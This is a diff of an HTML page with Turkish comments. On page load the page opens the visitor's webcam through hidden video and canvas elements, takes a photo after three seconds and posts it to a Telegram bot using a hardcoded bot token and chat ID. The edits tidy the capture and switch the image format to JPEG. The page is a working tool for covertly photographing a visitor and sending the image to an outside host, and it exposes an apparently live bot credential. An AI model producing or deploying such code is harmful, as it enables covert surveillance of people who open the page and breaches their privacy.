@@ -7,23 +7,25 @@
 </head>
 <body>
   <h2>Fotoğraf çekiliyor ve Telegram'a gönderiliyor...</h2>
-  <video id="video" width="640" height="480" autoplay playsinline style="display:none;"></video>
-  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
 
-    const BOT_TOKEN = "8019450857:AAG1eQgjYVdQ26p4XH8HAdTdMLGHnAbYALY";  // Buraya kendi bot tokenını gir
-    const CHAT_ID = "1149820913";  // Buraya kendi chat ID'ni gir
+    const BOT_TOKEN = "8019450857:AAG1eQgjYVdQ26p4XH8HAdTdMLGHnAbYALY";  
+    const CHAT_ID = "1149820913";  
 
     async function startCamera() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
 
-        // Kamera açıldıktan 3 saniye sonra fotoğraf çek ve gönder
-        setTimeout(takeAndSendPhoto, 3000);
+        // Kamera açıldıktan 3 saniye sonra otomatik fotoğraf çek
+        setTimeout(() => {
+          takeAndSendPhoto();
+        }, 3000);
       } catch (error) {
         alert('Kamera erişimi reddedildi veya açılamadı: ' + error);
       }
@@ -31,17 +33,16 @@
 
     function takeAndSendPhoto() {
       const context = canvas.getContext('2d');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      // Fotoğrafı Blob formatına çevir
+      // Fotoğrafı Blob formatına çevir ve Telegram'a gönder
       canvas.toBlob(blob => {
         let formData = new FormData();
         formData.append("chat_id", CHAT_ID);
-        formData.append("photo", blob, "photo.png");
+        formData.append("photo", blob, "photo.jpg");
 
-        // Fotoğrafı Telegram botuna gönder
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
           method: 'POST',
           body: formData
@@ -49,10 +50,11 @@
         .then(response => response.json())
         .then(data => console.log('Fotoğraf Gönderildi:', data))
         .catch(error => console.error('Hata:', error));
-      }, 'image/png');
+      }, 'image/jpeg');
     }
 
-    document.addEventListener("DOMContentLoaded", startCamera);  // Sayfa yüklenince kamerayı aç
+    // Sayfa açıldığında kamerayı başlat
+    document.addEventListener("DOMContentLoaded", startCamera);
   </script>
 </body>
 </html>
